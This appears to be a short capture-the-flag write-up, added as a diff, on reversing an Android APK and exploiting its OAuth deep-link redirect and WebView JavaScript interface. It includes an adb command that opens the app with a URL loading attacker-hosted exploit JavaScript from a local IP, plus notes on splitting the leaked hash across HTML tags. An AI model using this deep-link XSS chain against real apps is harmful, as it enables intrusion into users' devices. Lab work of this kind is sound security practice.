@@ -1,0 +1,18 @@
+1. download .apk
+2. unzip apk
+3. d2j-dex2jar clases.dex
+4. open jd-gui classes-dex2jar.jar
+5. analize code in java and Android Manifest
+5.1 first flag founds in copy redirection url and browser pc
+and inspect code html.
+6. apply adb shell am start -a -W android.intent.action.VIEW -d
+"oauth://final/?uri=http://192.168.222.206:8000/exploitjs.html
+code review in directory 
+Note: Url and redirect are in MainActivity.class and Browser.class
+and WebAppInterface.class-->here available javascript for XSS
+and code again it's here directory
+Inconvent: the android emulate movile has trouble because of 
+hash print incomplete, how solution I realized new file .html 
+named exploitjs2 and this file add function slice string in 
+three section printed in tags <p> with id msg1, msg2 and ms3
+
